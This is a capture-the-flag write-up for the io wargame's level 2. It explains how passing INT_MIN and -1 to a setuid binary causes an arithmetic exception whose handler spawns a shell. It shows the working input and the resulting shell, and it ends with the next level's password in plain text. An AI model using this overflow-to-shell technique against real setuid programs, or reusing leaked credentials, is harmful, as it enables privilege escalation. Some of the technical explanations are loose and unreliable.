# Level 02

In this level, is provided to us a binary at ***/levels/level02***, let's run
```
level2@io:/levels$ ./level02
source code is available in level02.c
```

If you take a look at the source code you have this:


```c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
	    printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
        puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

So, the program expect us to send 2 arguments (because the first one is the path of the program itself) and the second number must be not equal to zero (***!atoi(argv[2])***), then he get's the absolute value of the first argument and divide be a integer in argument two.


But before that, note that ***signal*** function, this function waits from some system [signal]() in this case a SIGFPE signal and hook into a custom function to handle that, we see that the function catcher has call to ***/bin/sh***. So we need to trigger a SIGFPE signal to make the program call the catcher function.


SIGFPE signal is trigged when there is a exception in an arithmetic operation, there is three possible cause of this:

- Division by zero
- Integer overflow
- Module by zero

With this information we see that the second condition avoids 0 in the second parameters, stoping us to send zero directly.

If you run ***file*** in this binary you will find that is a 32bits ELF file and ***uname*** will reveal that we are running in a i386

File:
```
level2@io:/levels$ file level02
level02: setuid ELF 32-bit...
```
Uname:
```
level2@io:/levels$ uname -a
... i686 GNU/Linux
```

### Signed integers in x86

Before we dig into the exploit itself, we need to understand how integers are stored in a 32bit memory layout, take a look at this simple software in C that displays integers in hexa and decimal:

```c
#include <stdio.h>
#include <stdint.h>
#include <limits.h>

int main() 
{
	int max = INT_MAX;
	int min = INT_MIN;
	
	
	int random = 323232;
	int random2 = -1;

	printf("0x%x - %d\n", max, max);
	printf("0x%x - %d\n", min, min);
	printf("0x%x - %d\n", random, random);
	printf("0x%x - %d\n", random2, random2);
	printf("0x%x - %d\n", -max, -max);
        
	return 0;
```

Run this and take a look at the output itself:
```
 >>> ./integers                                                                    
0x7fffffff - 2147483647
0x80000000 - -2147483648
0x4eea0 - 323232
0xffffffff - -1
0x80000001 - -2147483647
```

We know that a 32 bit system hold a address of 4 bytes, so the maximum value that we can hold in a ***unsigned*** integer is 4294967296 (2**32), but a signed value need a way to hold negative numbers.


So a ***signed*** integer number need to divide the maximum bytes in 32bits in two parts, a positive one and a negative one, the max signed integer is the half of the 2**arch, in our case 2147483647(0x7fffffff) and the negative numbers is everything above this (0x80000000).

Now take a look in this simple calculation:

```c
#include <stdio.h>
#include <stdint.h>

main() {
	int32_t x = 1;
	int32_t y = 2;
	int32_t res = x - y;
	
	printf("%d = 0x%08x\n", x, x);
	printf("%d = 0x%08x\n", y, y);
	printf("%d = %d - %d\n", res, x, y);
	printf("0x%08x = 0x%08x - 0x%08x\n", res, x, y);
}
-----------------------------------------------------------------------------
Level02 >>> ./operation
1 = 0x00000001
2 = 0x00000002
-1 = 1 - 2
0xffffffff = 0x00000001 - 0x00000002
```

When the CPU execute this sub, it will give us a Carry flag (CF) indicating that a number is bigger than another and the value will be negative, so we get 0xFFFFFFFF which indicate -1, it's like going back in the clock and when we reach the INT_MIN we start from the INT_MAX.



Another thing, some CPUS use the following formula to compute negative numbers into postive numbers:
```
x = (~x + 1)
0xF == (~-0xF + 1)  # <- True
```
Breaking down into INT_MIN

```
0x80000000
x = (~-0x80000000 + 1)
x = (-2147483647 + 1)
x = 2147483648
```


So to make a integer overflow we can pass as the second argument ***-1*** (0xffffffff) and the first argument will be the INT_MIN value, when abs try to make abs(INT_MIN), it will run the formula above and the the value returned will be 2147483648/1, but ***2147483648*** is too large for a 32bit processor.

```
level2@io:/levels$ ./level02 -2147483648 -1
source code is available in level02.c

WIN!
sh-4.3$ whoami
level3
sh-4.3$ id
uid=1003(level3) gid=1002(level2) groups=1002(level2),1029(nosu)
sh-4.3$ 
```


I was not able to solve this alone, i look for a lot of resources and i actually found this way to make a integer overflow, but all the research made for understand help me a lot, after you finish this there is a quick explaination too.


There is also a level02_alt.

Level 3 -> OlhCmdZKbuzqngfz